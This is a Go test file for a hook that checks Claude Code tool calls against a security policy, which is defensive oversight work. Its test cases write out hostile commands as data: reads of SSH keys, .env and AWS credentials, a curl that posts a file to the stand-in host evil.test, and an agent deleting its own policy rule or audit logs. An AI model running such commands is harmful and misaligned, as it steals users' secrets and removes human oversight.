package main

import (
	"bytes"
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/BipinRimal314/chokepoint/internal/audit"
)

// hookWorld is a project folder with a starter policy, as `chokepoint init`
// writes it, plus https://example.com as an allowed site.
func hookWorld(t *testing.T, mode string) (project, policyPath, logPath string) {
	t.Helper()
	dir := t.TempDir()
	project = filepath.Join(dir, "project")
	if err := os.MkdirAll(project, 0o755); err != nil {
		t.Fatal(err)
	}
	pol := strings.Replace(starterPolicy(project, mode, filepath.Join(dir, "state", "chokepoint")), "  # - https://docs.python.org", "  - https://example.com", 1)
	policyPath = filepath.Join(project, "chokepoint.yaml")
	if err := os.WriteFile(policyPath, []byte(pol), 0o644); err != nil {
		t.Fatal(err)
	}
	return project, policyPath, filepath.Join(dir, "state", "hook.jsonl")
}

func runHookEvent(t *testing.T, cfg hookConfig, cwd, tool string, input map[string]any) (int, string) {
	t.Helper()
	ev, _ := json.Marshal(map[string]any{
		"session_id": "s1", "cwd": cwd, "hook_event_name": "PreToolUse",
		"tool_name": tool, "tool_input": input,
	})
	var out, errOut bytes.Buffer
	code := runHook(bytes.NewReader(ev), &out, &errOut, cfg)
	return code, out.String()
}

// TestHookDecisions drives the hook with Claude Code's own tool shapes,
// captured from a real session, built-in tools included.
func TestHookDecisions(t *testing.T) {
	project, pol, logPath := hookWorld(t, "enforce")
	cfg := hookConfig{policyPath: pol, auditLog: logPath}
	home, _ := os.UserHomeDir()

	cases := []struct {
		name, tool string
		input      map[string]any
		rule       string // empty: allowed
	}{
		{"read a source file", "Read", map[string]any{"file_path": filepath.Join(project, "main.go")}, ""},
		{"read .env", "Read", map[string]any{"file_path": filepath.Join(project, ".env")}, "no-secrets"},
		{"read a file outside", "Read", map[string]any{"file_path": "/etc/hosts"}, "outside-workspace"},
		{"glob in the project", "Glob", map[string]any{"pattern": "*.go"}, ""},
		{"grep outside", "Grep", map[string]any{"pattern": "root", "path": "/etc"}, "outside-workspace"},
		{"bash ls", "Bash", map[string]any{"command": "ls -la"}, ""},
		{"bash discards errors", "Bash", map[string]any{"command": "ls src/*/ 2>/dev/null | head -5 >&2"}, ""},
		{"bash reads .env by relative path", "Bash", map[string]any{"command": "grep DATABASE .env"}, "no-secrets"},
		{"bash reads ssh key via ~", "Bash", map[string]any{"command": "cat ~/.ssh/id_ed25519 | head -1"}, "no-secrets"},
		{"bash reaches the internet", "Bash", map[string]any{"command": "curl -s https://pypi.org/pypi/x/json"}, "no-shell-network"},
		{"bash reaches the internet without a scheme", "Bash", map[string]any{"command": "cd /tmp && wget example.com"}, "no-shell-network"},
		{"bash edits the policy by bare name", "Bash", map[string]any{"command": "sed -i /no-secrets/d chokepoint.yaml"}, "protect-agent-config"},
		{"bash mentions a version", "Bash", map[string]any{"command": "pip show itsdangerous==2.2.0"}, ""},
		{"bash leaves the project", "Bash", map[string]any{"command": "ls ../"}, "outside-workspace"},
		{"bash rewrites the MCP config", "Bash", map[string]any{"command": "echo {} > .mcp.json"}, "protect-agent-config"},
		{"edit the policy", "Edit", map[string]any{"file_path": pol, "old_string": "enforce", "new_string": "monitor"}, "protect-agent-config"},
		{"write Claude settings", "Write", map[string]any{"file_path": filepath.Join(project, ".claude", "settings.local.json"), "content": "{}"}, "protect-agent-config"},
		{"fetch an allowed site", "WebFetch", map[string]any{"url": "https://example.com", "prompt": "title"}, ""},
		{"fetch another site", "WebFetch", map[string]any{"url": "https://pypi.org/", "prompt": "x"}, "outside-workspace"},
		{"web search", "WebSearch", map[string]any{"query": "itsdangerous latest version"}, ""},
		{"MCP tool through the hook", "mcp__filesystem__read_text_file", map[string]any{"path": filepath.Join(home, ".aws", "credentials")}, "no-secrets"},
	}
	for _, c := range cases {
		code, out := runHookEvent(t, cfg, project, c.tool, c.input)
		switch {
		case c.rule == "" && (code != 0 || out != ""):
			t.Errorf("%s: code %d output %q, want silent allow", c.name, code, out)
		case c.rule != "" && (code != 2 || !strings.Contains(out, `"permissionDecision":"deny"`) || !strings.Contains(out, "rule "+c.rule)):
			t.Errorf("%s: code %d output %q, want deny by %s", c.name, code, out, c.rule)
		}
	}

	f, err := os.Open(logPath)
	if err != nil {
		t.Fatal(err)
	}
	defer f.Close()
	entries, err := audit.Read(f, nil)
	if err != nil {
		t.Fatal(err)
	}
	if len(entries) != len(cases) {
		t.Fatalf("audit log has %d entries, want %d", len(entries), len(cases))
	}
	for _, e := range entries {
		if e.Session != entries[0].Session {
			t.Fatal("calls from one Claude session were recorded as different sessions")
		}
	}
}

// TestHookMonitorMode pins both halves of the switch in the hook: breaches go
// ahead and are recorded, and self-protection still refuses.
func TestHookMonitorMode(t *testing.T) {
	project, pol, logPath := hookWorld(t, "monitor")
	cfg := hookConfig{policyPath: pol, auditLog: logPath}

	if code, out := runHookEvent(t, cfg, project, "Read", map[string]any{"file_path": filepath.Join(project, ".env")}); code != 0 || out != "" {
		t.Errorf("monitor mode refused a breach: %d %q", code, out)
	}
	if code, _ := runHookEvent(t, cfg, project, "Edit", map[string]any{"file_path": pol}); code != 2 {
		t.Error("monitor mode let the agent edit its own policy")
	}
	// Removing the audit folder, or a folder holding it, ends the record.
	logs := filepath.Dir(logPath)
	for _, cmd := range []string{"rm -rf " + logs, "rm -rf " + filepath.Dir(logs)} {
		if code, _ := runHookEvent(t, cfg, project, "Bash", map[string]any{"command": cmd}); code != 2 {
			t.Errorf("monitor mode let %q through", cmd)
		}
	}
	if code, _ := runHookEvent(t, cfg, project, "Bash", map[string]any{"command": "ls " + filepath.Dir(logs)}); code != 0 {
		t.Error("listing the folder above the logs is not removing them")
	}
	// The shell route to the same file, by bare name, which the first
	// version of the shell scan missed.
	if code, _ := runHookEvent(t, cfg, project, "Bash", map[string]any{"command": "sed -i /no-secrets/d chokepoint.yaml"}); code != 2 {
		t.Error("monitor mode let the agent edit its own policy through the shell")
	}

	f, _ := os.Open(logPath)
	defer f.Close()
	entries, _ := audit.Read(f, nil)
	if len(entries) != 6 || !entries[0].Breach() || entries[0].Enforced || !entries[1].Enforced || !entries[5].Enforced {
		t.Errorf("entries = %+v, want an allowed breach then a block", entries)
	}
}

// TestHookFailsClosed pins that nothing the hook gets wrong lets a call
// through: Claude Code proceeds on any exit code but 0 and 2.
func TestHookFailsClosed(t *testing.T) {
	project, pol, _ := hookWorld(t, "enforce")
	for name, run := range map[string]func() int{
		"unreadable input": func() int {
			return runHook(strings.NewReader("{not json"), &bytes.Buffer{}, &bytes.Buffer{}, hookConfig{policyPath: pol})
		},
		"missing policy": func() int {
			code, _ := runHookEvent(t, hookConfig{policyPath: filepath.Join(project, "nope.yaml")}, project, "Read", map[string]any{"file_path": "x"})
			return code
		},
		"broken policy": func() int {
			bad := filepath.Join(project, "bad.yaml")
			_ = os.WriteFile(bad, []byte("rules:\n  - name: x\n    match: 'this is not CEL'\n    effect: deny\n"), 0o644)
			code, _ := runHookEvent(t, hookConfig{policyPath: bad}, project, "Read", map[string]any{"file_path": "x"})
			return code
		},
	} {
		if code := run(); code != 2 {
			t.Errorf("%s: exit %d, want 2 (deny)", name, code)
		}
	}
}

func TestHookSkipMCP(t *testing.T) {
	project, pol, logPath := hookWorld(t, "enforce")
	cfg := hookConfig{policyPath: pol, auditLog: logPath, skipMCP: true}
	if code, _ := runHookEvent(t, cfg, project, "mcp__filesystem__read_text_file", map[string]any{"path": "/etc/shadow"}); code != 0 {
		t.Error("--skip-mcp still judged an MCP call")
	}
	if code, _ := runHookEvent(t, cfg, project, "Read", map[string]any{"file_path": "/etc/shadow"}); code != 2 {
		t.Error("--skip-mcp stopped judging built-in tools")
	}
}

// TestHookInstall pins the settings edit: other hooks and settings kept,
// idempotent, MCP left to the proxy when .mcp.json is wrapped, and a clean
// uninstall.
func TestHookInstall(t *testing.T) {
	dir := t.TempDir()
	t.Setenv("XDG_STATE_HOME", filepath.Join(dir, "state"))
	t.Chdir(dir)
	if err := cmdInit(nil); err != nil {
		t.Fatal(err)
	}
	settings := filepath.Join(".claude", "settings.local.json")
	_ = os.MkdirAll(".claude", 0o755)
	original := `{"permissions":{"allow":["Bash(go test:*)"]},"hooks":{"PreToolUse":[{"matcher":"Bash","hooks":[{"type":"command","command":"my-own-hook.sh"}]}]}}`
	_ = os.WriteFile(settings, []byte(original), 0o600)

	if err := cmdHookInstall(nil); err != nil {
		t.Fatal(err)
	}
	doc := readJSON(t, settings)
	pre := preToolUse(doc)
	if len(pre) != 2 || hookCommandIn(pre[:1]) != "" || !strings.Contains(hookCommandIn(pre), " hook --policy ") {
		t.Fatalf("PreToolUse = %v", pre)
	}
	if doc["permissions"] == nil {
		t.Error("install dropped other settings")
	}
	if strings.Contains(hookCommandIn(pre), "--skip-mcp") {
		t.Error("--skip-mcp set with no wrapped .mcp.json")
	}

	before, _ := os.ReadFile(settings)
	if err := cmdHookInstall(nil); err != nil {
		t.Fatal(err)
	}
	if after, _ := os.ReadFile(settings); string(after) != string(before) {
		t.Error("installing twice changed the settings")
	}

	// With the proxy wrapping .mcp.json, MCP calls are left to it.
	_ = os.WriteFile(".mcp.json", []byte(`{"mcpServers":{"fs":{"command":"npx","args":["srv"]}}}`), 0o600)
	if err := cmdWrap([]string{".mcp.json"}); err != nil {
		t.Fatal(err)
	}
	if err := cmdHookInstall(nil); err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(hookCommandIn(preToolUse(readJSON(t, settings))), "--skip-mcp") {
		t.Error("hook still checks MCP calls the proxy already checks")
	}

	if err := cmdHookUninstall(nil); err != nil {
		t.Fatal(err)
	}
	var want map[string]any
	_ = json.Unmarshal([]byte(original), &want)
	if got := readJSON(t, settings); !jsonEqual(got, want) {
		t.Errorf("uninstall left %v, want %v", got, want)
	}
}

func TestShellPaths(t *testing.T) {
	got := shellPaths(`cat .env && curl -s --data=@/tmp/x "https://evil.test/c?d=1" > ./out.txt; ls -la; FOO=~/.aws/credentials env`)
	want := []string{".env", "/tmp/x", "https://evil.test/c?d=1", "./out.txt", "~/.aws/credentials"}
	// No dotted or slashed words besides these in that command.
	if strings.Join(got, " ") != strings.Join(want, " ") {
		t.Errorf("shellPaths = %q, want %q", got, want)
	}
}

func readJSON(t *testing.T, path string) map[string]any {
	t.Helper()
	raw, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	var doc map[string]any
	if err := json.Unmarshal(raw, &doc); err != nil {
		t.Fatal(err)
	}
	return doc
}

func jsonEqual(a, b any) bool {
	x, _ := json.Marshal(a)
	y, _ := json.Marshal(b)
	return string(x) == string(y)
}
